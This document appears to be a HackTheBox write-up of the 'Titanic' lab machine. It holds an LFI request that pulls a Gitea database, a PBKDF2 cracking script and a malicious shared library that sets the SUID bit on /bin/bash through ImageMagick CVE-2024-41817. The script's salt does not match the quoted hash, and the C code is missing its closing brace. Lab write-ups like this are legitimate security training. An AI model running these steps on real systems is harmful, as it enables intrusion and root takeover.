## Welcome everyone!

Today, we will explore *Titanic*, an easy-level challenge from **HackTheBox**.

Without further ado, let’s get started!

![image](/HTB/Titanic/Titanic_images/1.png)

(Please ensure that you have added the following line   `TARGET_IP     titanic.htb`   to your local `/etc/hosts` file to enable DNS resolution)





## Information Gathering



We can start by performing an aggressive **Nmap** scan to gather as much information as possible about the target:

![image](/HTB/Titanic/Titanic_images/2.png)

We can identify two exposed services:

**SSH** (OpenSSH 8.9p1 | 22)

**HTTP** (Apache 2.4.52 / Werkzeug 3.0.3 | 80)

We can start by inspecting the website hosted on port **80**:

![image](/HTB/Titanic/Titanic_images/3.png)

The root page is dedicated to customers having an interest for titanics. We can provide some user input when we click on the *Book Your Trip* button:

![image](/HTB/Titanic/Titanic_images/4.png)

After attempting few **XSS techniques**, there is no way to extract sensitive information from these fields. We can use Gobuster to enumerate potentials hidden web directories:

![image](/HTB/Titanic/Titanic_images/5.png)

The `/download` endpoint returns an intriguing error. Let’s inspect it to see what causes this response:

![image](/HTB/Titanic/Titanic_images/6.png)

It appears that the endpoint need a `ticket` GET parameter to be functional.

We can provide it with the assigned value to `1`:

![image](/HTB/Titanic/Titanic_images/7.png)

The web server can now treat our requests. The application may be vulnerable to **Local File Inclusion** (LFI) if user’s input is improperly handled. This vulnerability allows an attacker to retrieve local system files from their web browser. We can attempt to retrieve for example the `/etc/hosts` file making a request at the following URL:

`http://titanic.htb/download?ticket=/etc/hosts`

![image](/HTB/Titanic/Titanic_images/8.png)

This confirms that the web application is vulnerable to Local File Inclusion. We successfully downloaded the `/etc/hosts` file from the target, allowing us to view its content:

![image](/HTB/Titanic/Titanic_images/9.png)

The target appears to hosts a subdomain: `dev.titanic.htb`.

Is this subdomain accessible from our machine?

Let’s verifying it by performing subdomain enumeration using `ffuf`:

![image](/HTB/Titanic/Titanic_images/10.png)

Wonderful, we identified a valid subdomain: `dev.titanic.htb`. We may find useful stuff there. Let’s add it to our `/etc/hosts file` in order to access it:

![image](/HTB/Titanic/Titanic_images/11.png)

We can now access the subdomain via our web browser:

![image](/HTB/Titanic/Titanic_images/12.png)

The subdomain appears to host a Gitea application. We can identify its version at the very bottom of the page: **v1.22.1** 




## Initial Access


Getting back to our LFI vulnerability, we can retrieve the `gitea.db` file containing SQLite3 database configuration for the users at the following URL:

`http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db`

We can then interact with the file using `sqlite3 gitea.db`:

![image](/HTB/Titanic/Titanic_images/13.png)

We can retrieve the PBKDF2-HMAC-SHA256 hash of the systems users, including the **developer** user. The hash takes the following structure:

`sha256:50000:0ce6f07fc9b557bc070fa7bef76a0d15:e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56`

We can attempt to recover the plaintext password by performing a dictionary-based brute-force attack against the PBKDF2 hash with the following script:

`import hashlib`

`import binascii`

`from pwn import log`

`salt  = binascii.unhexlify('8bf3e3452b78544f8bee9400d6936d34')  # 16 bytes`

`key   = 'e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56'`

`dklen = 50`

`iterations = 50000`

`def hash(password, salt, iterations, dklen):`

`hashValue = hashlib.pbkdf2_hmac(`

`hash_name='sha256',`

`password=password,`

`salt=salt,`

`iterations=iterations,`

`dklen=dklen,`

`)`

`return hashValue`

`dict = '/usr/share/wordlists/rockyou.txt'`

`bar  = log.progress('Cracking PBKDF2')`

`with open(dict, 'r', encoding='utf-8') as f:`

`for line in f:`

`password  = line.strip().encode('utf-8')`

`hashValue = hash(password, salt, iterations, dklen)`

`target    = binascii.unhexlify(key)`

`# log.info(f'Our target is: {target}')`

`bar.status(f'Trying: {password}, hash: {hashValue}')`

`if hashValue == target:`

`bar.success(f'Found password: {password}!')`

`break`

`bar.failure('Hash is not crackable.')`

You may need to install the `pwn` Python library. run the following commands in order to make the script functional:

`python3 -m venv venv`

`source venv/bin/activate`

`pip3 install pwn`

After a few minutes, the script successfully retrieve the cleartext password for the user **developer**:

![image](/HTB/Titanic/Titanic_images/14.png)

We can assume that the password has been reused over SSH. Let’s attempt to authenticate with the following credentials:

`developer:25282528`

![image](/HTB/Titanic/Titanic_images/15.png)

It works! We successfully obtained initial access on the machine as the user **developer** leveraging a password reuse weakness. We can list the current directory and retrieve the first flag:

![image](/HTB/Titanic/Titanic_images/16.png)





## Privilege Escalation



We now need to escalate our current privileges to **root** in order to retrieve the final flag. It is a good practice to start enumerating privilege escalation vectors by running `sudo -l` when we have a valid password. It allows us to list potential command that can be run with **root privileges**.

![image](/HTB/Titanic/Titanic_images/17.png)

But here, it seems that we can’t do this. Enumerating SUID & capabilities doesn’t reveal anything uncommon. Inspecting the `/opt/scripts` directory reveals a Bash script that may be running as a scheduled task. Inspecting it reveals that **ImageMagick** is installed on the target:

![image](/HTB/Titanic/Titanic_images/18.png)

ImageMagick is a software suite for image treatment that works in the terminal command line.

Researching for potential vulnerability affecting this software leads us to the `CVE-2024-41817`. It may lead to remote code execution under specific conditions involving delegate configuration and shared library loading.

We first need to create a `libxcb.c` file in the /tmp directory with the following code:

```jsx
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void init(){
    system("chmod +s /bin/bash");
    exit(0);
```

This malicious library will set the **SUID bit** on the `/bin/bash` binary. Since the `identify_images.sh` script is running with **root privileges**, it can lead to arbitrary code execution with elevated privileges, resulting in root-level access

We then need to create a shared library using `gcc`. We will execute the following command:

`gcc -x c -shared libxcb.c -fPIC -o ./libxcb.so.1`

Move the malicious shared library in the `/images` folder:

`mv libxcb.so.1 /opt/app/static/assets/images/`

After a couple of seconds, we should observe the `/bin/bash` binary with an SUID bit set on it:

![image](/HTB/Titanic/Titanic_images/19.png)

It works! Now we have set the SUID bit on `/bin/bash`, we can execute it with the `-p` switch to make the binary keep the owner’s privileges during the execution:

![image](/HTB/Titanic/Titanic_images/1-20.png)

We successfully elevated our privileges to root, granting full access and control over the target system! We can now navigate in the /root directory to retrieve the final flag:

![image](/HTB/Titanic/Titanic_images/21.png)

Challenge completed!

![image](/HTB/Titanic/Titanic_images/22.png)





## Conclusion



The *Titanic* challenge demonstrates a realistic attack chain combining multiple common web and system vulnerabilities into a full compromise scenario. We began with standard information gathering, identifying exposed services and a web application built with Flask and Apache. Through content discovery and endpoint analysis, we identified a **Local File Inclusion (LFI)** vulnerability in the `/download` endpoint, which allowed access to sensitive files on the system.

Exploiting this LFI provided access to the application’s internal SQLite database, revealing user credentials stored as PBKDF2 hashes. By extracting and cracking these hashes, we obtained valid credentials for the **developer** user, enabling initial SSH access to the system through password reuse.

Once inside the machine, privilege escalation required deeper system enumeration. A scheduled script using ImageMagick was identified, exposing a vulnerable version affected by CVE-2024-41817. By abusing ImageMagick’s delegate mechanism, a malicious shared library was executed with elevated privileges, ultimately allowing modification of `/bin/bash` and leading to full root access.

This challenge highlights several key security lessons:

- The impact of **LFI vulnerabilities** in exposing internal application data
- The risks of **credential reuse** across services
- The importance of securely handling system tools like ImageMagick in privileged contexts
- How seemingly low-level misconfigurations can lead to **complete system compromise**

Overall, *Titanic* provides a solid example of a full attack path from initial web exposure to root compromise, emphasizing the importance of layered security controls and proper system hardening.
